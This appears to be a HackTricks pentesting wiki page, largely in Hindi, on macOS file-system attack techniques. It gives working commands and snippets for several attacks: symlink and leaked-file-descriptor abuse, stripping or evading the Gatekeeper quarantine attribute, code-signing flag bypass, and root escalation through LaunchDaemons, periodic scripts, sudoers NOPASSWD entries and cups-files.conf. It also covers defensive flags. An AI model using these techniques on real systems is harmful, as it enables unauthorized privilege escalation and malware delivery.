# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX permissions combinations

**directory** में permissions:

- **read** - आप directory entries को **enumerate** कर सकते हैं
- **write** - आप directory में **files** को **delete/write** कर सकते हैं और **empty folders** को **delete** कर सकते हैं।
- लेकिन आप **non-empty folders** को **delete/modify** नहीं कर सकते, जब तक आपके पास उस पर write permissions न हों।
- आप किसी folder का **name modify** नहीं कर सकते, जब तक आप उसके owner न हों।
- **execute** - आपको directory को **traverse** करने की अनुमति होती है - यदि आपके पास यह अधिकार नहीं है, तो आप इसके अंदर या किसी subdirectories में मौजूद files को access नहीं कर सकते।

### Dangerous Combinations

**root के ownership वाली file/folder को overwrite करने के तरीके**, लेकिन:

- Path में एक parent **directory owner** user है
- Path में एक parent **directory owner** एक **users group** है जिसके पास **write access** है
- एक users **group** के पास **file** पर **write** access है

पिछले combinations में से किसी के साथ, attacker expected path में एक **sym/hard link** **inject** कर सकता है और privileged arbitrary write प्राप्त कर सकता है।

### Folder root R+X Special case

यदि किसी **directory** में ऐसी files हैं जिनके पास **केवल root** का R+X access है, तो वे किसी अन्य व्यक्ति के लिए **accessible** नहीं होतीं। इसलिए ऐसी vulnerability जो किसी user द्वारा readable file को, उस **restriction** के कारण पढ़े बिना, इस folder से **किसी दूसरी जगह move** करने की अनुमति देती है, इन files को पढ़ने के लिए abuse की जा सकती है।

Example in: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Symbolic Link / Hard Link

### Permissive file/folder

यदि कोई privileged process ऐसी **file** में data लिख रहा है जिसे किसी **lower privileged user** द्वारा **controlled** किया जा सकता है, या जिसे पहले से किसी lower privileged user द्वारा **created** किया जा सकता है। User इसे Symbolic या Hard link के माध्यम से बस **किसी दूसरी file की ओर point** कर सकता है, और privileged process उस file पर लिखेगा।

अन्य sections में देखें कि attacker **privileges escalate करने के लिए arbitrary write का abuse** कैसे कर सकता है।

### Open `O_NOFOLLOW`

[`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html) के अनुसार: *"यदि mask में `O_NOFOLLOW` का उपयोग किया गया है और `open()` को दी गई target file एक symbolic link है, तो `open()` fail हो जाएगा।"* केवल **final** component की जाँच की जाती है — प्रत्येक **intermediate** component अभी भी resolve और follow होता है। इसलिए कोई developer जिसने `O_NOFOLLOW` से write को "protected" किया है, target path की किसी भी **parent directory** में symlink plant करके attack किया जा सकता है।

वही man page उन flags को document करता है जो वास्तव में इस gap को बंद करते हैं:

- **`O_NOFOLLOW_ANY`** — *"यदि ... `open()` को दिए गए path का कोई भी component symbolic link है, तो `open()` fail हो जाएगा।"*
- **`O_RESOLVE_BENEATH`** — *"यदि ... specified path resolution उस fd से associated directory से बाहर निकलती है, तो `openat()` fail हो जाएगा।"*

अन्यथा, ऐसे directory FD के relative `openat()` का उपयोग करना जिसे आपने पहले validate किया है, या `realpath()` + re-validation, mid-path symlink swaps को रोकने के शेष तरीके हैं।

## .fileloc

**`.fileloc`** extension वाली files अन्य applications या binaries की ओर point कर सकती हैं, इसलिए जब उन्हें open किया जाता है, तो application/binary execute होगा।\
Example:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## फ़ाइल डिस्क्रिप्टर

### Leak FD (no `O_CLOEXEC`)

यदि `open` कॉल में `O_CLOEXEC` flag नहीं है, तो file descriptor child process द्वारा inherit कर लिया जाएगा। इसलिए, यदि कोई privileged process किसी privileged file को open करके attacker द्वारा नियंत्रित process को execute करता है, तो attacker **privileged file का FD inherit कर लेगा**।

इसका canonical example **`DYLD_PRINT_TO_FILE` LPE in OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)) है:

- `dyld` ने **restricted (suid root) binaries** में भी `DYLD_PRINT_TO_FILE=/path` को स्वीकार किया, क्योंकि उस particular variable को `processDyldEnvironmentVariable()` के बाहर parse किया गया था।
- इसने `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)` चलाया, इसलिए इसने किसी भी arbitrary path पर **root-owned file create की**।
- FD को **कभी close नहीं किया गया और उसमें close-on-exec flag नहीं था**, इसलिए suid binary की प्रत्येक child ने **root-owned file के लिए writable FD inherit किया**।
- उदाहरण के लिए `DYLD_PRINT_TO_FILE=/etc/target suid_binary` चलाने और फिर child में inherited FD number पढ़ने से arbitrary root-owned writes संभव हो गए; `fcntl(fd, F_SETFL, 0)` ने `O_APPEND` को clear करके append करने के बजाय overwrite करने की अनुमति भी दी।

यही pattern तब भी दिखाई देता है जब कोई privileged process आपके नियंत्रण वाली किसी चीज़ को `exec` करने से **पहले** file open करता है (helper tools, `$EDITOR` के माध्यम से invoke किए गए `crontab`-style editors, env-var path से open की गई log/debug files...)। अपने द्वारा inherited FDs को इस command से enumerate करें:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
`2` से ऊपर की कोई भी चीज़, जो ऐसी फ़ाइल की ओर संकेत करती है जिसे आप स्वयं खोल नहीं सकते, एक arbitrary-write (या arbitrary-read) primitive है।

## quarantine xattrs tricks से बचें

### इसे हटाएँ
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

यदि किसी फ़ाइल/फ़ोल्डर में यह immutable attribute है, तो उस पर xattr लगाना संभव नहीं होगा
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### xattr support के बिना file systems

macOS द्वारा mount किए जा सकने वाले हर file system में **extended attributes** को native रूप से store करने की सुविधा नहीं होती। HFS+ और APFS में यह सुविधा होती है; **FAT32, exFAT और (अधिकांश) NFS mounts में नहीं** — macOS उन्हें `._<filename>` नाम वाली एक **AppleDouble** side file लिखकर emulate करता है ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/))।

यह quarantine के लिए महत्वपूर्ण है, क्योंकि xattr तभी survive करता है जब उसे उसी volume से वास्तव में **लिखा और फिर पढ़ा** जा सके:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
यदि volume को बाद में ऐसे path पर read किया जाता है जो `._` companion को अनदेखा करता है (या companion को strip/delete कर दिया जाता है), तो फ़ाइल **quarantine flag के बिना** पहुंचती है — और unquarantined `.app` App Sandbox से escape करने के लिए पर्याप्त है, जैसा कि [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute) में बताया गया है।

### writeextattr ACL

यह ACL फ़ाइल में `xattrs` जोड़ने से रोकता है
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** file format किसी file को उसके ACEs सहित copy करता है।

[**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) में यह देखा जा सकता है कि **`com.apple.acl.text`** नामक xattr के अंदर stored ACL text representation को decompressed file में ACL के रूप में set किया जाएगा। इसलिए, यदि आपने किसी application को **AppleDouble** file format के साथ एक zip file में compress किया हो, जिसमें ऐसा ACL हो जो अन्य xattrs को उसमें लिखे जाने से रोकता हो... तो application में quarantine xattr set नहीं किया गया:

अधिक जानकारी के लिए [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) देखें।

इसे replicate करने के लिए पहले हमें सही acl string प्राप्त करनी होगी:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(ध्यान दें कि भले ही यह काम करे, sandbox पहले quarantine xattr लिख देता है)

वास्तव में आवश्यक नहीं है, लेकिन केवल एहतियात के तौर पर इसे यहाँ छोड़ रहा हूँ:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## signature checks को Bypass करना

### platform binaries checks को Bypass करना

कुछ security checks यह जाँचते हैं कि binary एक **platform binary** है या नहीं, उदाहरण के लिए किसी XPC service से connect करने की अनुमति देने के लिए। हालाँकि, जैसा कि https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ पर bypass में बताया गया है, इस check को bypass करना संभव है: किसी platform binary (जैसे /bin/ls) को प्राप्त करके और `DYLD_INSERT_LIBRARIES` environment variable के माध्यम से dyld का उपयोग करके exploit inject करके।

### `CS_REQUIRE_LV` और `CS_FORCED_LV` flags को Bypass करना

किसी executing binary के लिए अपने flags को modify करके checks को bypass करना संभव है, जैसे कि इस code के साथ:
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Code Signatures को Bypass करना

Bundles में **`_CodeSignature/CodeResources`** फ़ाइल होती है, जिसमें **bundle** की प्रत्येक **file** का **hash** होता है। ध्यान दें कि CodeResources का hash भी **executable** में **embedded** होता है, इसलिए हम उसमें भी छेड़छाड़ नहीं कर सकते।

हालाँकि, कुछ files ऐसी होती हैं जिनकी signature check नहीं की जाएगी। इनमें plist में `omit` key होती है, जैसे:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
cli से किसी resource के signature की गणना करना संभव है:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## dmgs माउंट करना

एक user द्वारा बनाया गया custom dmg कुछ मौजूदा folders के ऊपर भी mount किया जा सकता है। इस तरह आप custom content के साथ एक custom dmg package बना सकते हैं:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
आमतौर पर macOS `com.apple.DiskArbitrarion.diskarbitrariond` Mach service (जो `/usr/libexec/diskarbitrationd` द्वारा प्रदान की जाती है) से बात करके disk mount करता है। यदि LaunchDaemons plist file में `-d` param जोड़कर उसे restart किया जाए, तो logs `/var/log/diskarbitrationd.log` में store होंगे।\
हालांकि, `hdik` और `hdiutil` जैसे tools का उपयोग करके सीधे `com.apple.driver.DiskImages` kext से communicate करना संभव है।

## Arbitrary Writes

### Periodic sh scripts

यदि आपकी script को **shell script** के रूप में interpret किया जा सकता है, तो आप **`/etc/periodic/daily/999.local`** shell script को overwrite कर सकते हैं, जिसे हर दिन trigger किया जाएगा।

आप इस script के execution को इस command से **fake** कर सकते हैं: **`sudo periodic daily`**

### Daemons

**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** जैसी arbitrary **LaunchDaemon** लिखें, जिसमें इस तरह की arbitrary script execute करने वाला plist हो:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
बस `/Applications/Scripts/privesc.sh` script generate करें, जिसमें वे **commands** हों जिन्हें आप root के रूप में चलाना चाहते हैं।

### Sudoers File

यदि आपके पास **arbitrary write** है, तो आप स्वयं को **sudo** privileges देने वाली file **`/etc/sudoers.d/`** folder के अंदर create कर सकते हैं।

### PATH files

File **`/etc/paths`** उन मुख्य स्थानों में से एक है जो PATH env variable को populate करते हैं। इसे overwrite करने के लिए आपके पास root privileges होना आवश्यक है, लेकिन यदि **privileged process** की कोई script **full path** के बिना कोई **command** execute कर रही है, तो आप इस file को modify करके उसे **hijack** कर सकते हैं।

आप **`/etc/paths.d`** में files लिखकर `PATH` env variable में नए folders भी load कर सकते हैं।

### cups-files.conf

इस technique का उपयोग [इस writeup](https://www.kandji.io/blog/macos-audit-story-part1) में किया गया था।

निम्नलिखित content वाली file `/etc/cups/cups-files.conf` create करें:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
यह `/etc/sudoers.d/lpe` फ़ाइल को permissions 777 के साथ बनाएगा। अंत में मौजूद अतिरिक्त junk error log बनाने के लिए है।

फिर, privileges escalate करने के लिए आवश्यक config `/etc/sudoers.d/lpe` में लिखें, जैसे `%staff ALL=(ALL) NOPASSWD:ALL`।

इसके बाद `/etc/cups/cups-files.conf` फ़ाइल को फिर से संशोधित करें और `LogFilePerm 700` निर्दिष्ट करें, ताकि `cupsctl` invoke करने पर नई sudoers फ़ाइल valid हो जाए।

### Sandbox Escape

FS arbitrary write के ज़रिए macOS sandbox से escape करना संभव है। कुछ examples के लिए [macOS Auto Start](../../../../macos-auto-start-locations.md) पेज देखें, लेकिन एक सामान्य तरीका है `~/Library/Preferences/com.apple.Terminal.plist` में ऐसी Terminal preferences फ़ाइल लिखना जो startup पर कोई command execute करे, और फिर उसे `open` का उपयोग करके call करना।

## अन्य users के रूप में writable files बनाना

एक बहुत सामान्य privesc primitive है कि आपके नियंत्रण वाली directory में **privileged process आपके लिए कोई file बनाए**, और फिर उस file पर **write access** बनाए रखे। इसके लिए दो चीज़ें आवश्यक हैं:

1. आपकी ownership वाली directory (या ऐसी directory जिसमें आप **inheritable ACL** सेट कर सकें), ताकि उसके अंदर बनाई गई हर चीज़ आपकी permissions inherit करे।
2. ऐसा privileged/`suid` process जिसे यह बताया जा सके कि file **कहाँ** बनानी है — आमतौर पर debug/logging environment variable, config file या helper के XPC API के ज़रिए।

**Inheritable ACL** वाला भाग यह सुनिश्चित करता है कि बनाई गई file आपके लिए writable हो, भले ही उसका owner कोई अन्य user हो। `file_inherit` / `directory_inherit` inheritance flags [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) में documented हैं:
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
अब कोई भी privileged process जो `$DIRNAME` के अंदर कोई file बनाता है, वह **आपके द्वारा writable** होगी। यदि वह directory ऐसी location भी है जिसे बाद में **root के रूप में execute** किया जाता है (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, कोई LaunchDaemon directory...), तो यह सीधे root escalation की ओर ले जाता है। File प्राप्त होने के बाद उसमें क्या लिखना है, इसके लिए ऊपर दिए गए [Sudoers File](#sudoers-file) और [cups-files.conf](#cups-filesconf) sections देखें।

"env variable makes a root process create a file, and the FD leaks to you" chain के पूर्ण worked example के लिए ऊपर [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) देखें।

## POSIX Shared Memory

**POSIX shared memory** POSIX-compliant operating systems में processes को एक common memory area access करने की अनुमति देता है, जिससे अन्य inter-process communication methods की तुलना में तेज communication संभव होती है। इसमें `shm_open()` के साथ shared memory object बनाना या खोलना, `ftruncate()` के साथ उसका size निर्धारित करना, और `mmap()` का उपयोग करके उसे process के address space में map करना शामिल है। इसके बाद processes इस memory area से सीधे read और write कर सकते हैं। Concurrent access को manage करने और data corruption रोकने के लिए अक्सर mutexes या semaphores जैसे synchronization mechanisms का उपयोग किया जाता है। अंत में, processes `munmap()` और `close()` के साथ shared memory को unmap और close करते हैं, और वैकल्पिक रूप से `shm_unlink()` के साथ memory object को remove करते हैं। यह system उन environments में efficient और fast IPC के लिए विशेष रूप से प्रभावी है जहाँ multiple processes को shared data को तेजी से access करने की आवश्यकता होती है।

<details>

<summary>Producer Code Example</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>उपभोक्ता कोड उदाहरण</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** macOS में पेश किया गया एक security feature है, जिसे user applications में **file descriptor operations** की safety और reliability बढ़ाने के लिए बनाया गया है। ये guarded descriptors file descriptors के साथ विशेष restrictions या "guards" जोड़ने का तरीका प्रदान करते हैं, जिन्हें kernel लागू करता है।

यह feature **unauthorized file access** या **race conditions** जैसी security vulnerabilities की कुछ श्रेणियों को रोकने के लिए विशेष रूप से उपयोगी है। ये vulnerabilities तब उत्पन्न होती हैं, जब उदाहरण के लिए कोई thread किसी file description को access कर रहा हो और **किसी अन्य vulnerable thread को उस पर access दे रहा हो**, या जब कोई file descriptor किसी vulnerable child process द्वारा **inherited** हो जाए। इस functionality से संबंधित कुछ functions हैं:

- `guarded_open_np`: guard के साथ एक FD खोलता है
- `guarded_close_np`: इसे बंद करता है
- `change_fdguard_np`: किसी descriptor पर guard flags बदलता है (guard protection हटाना भी संभव है)

## References

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)
- [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (ACL inheritance flags)
- [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

{{#include ../../../../banners/hacktricks-training.md}}
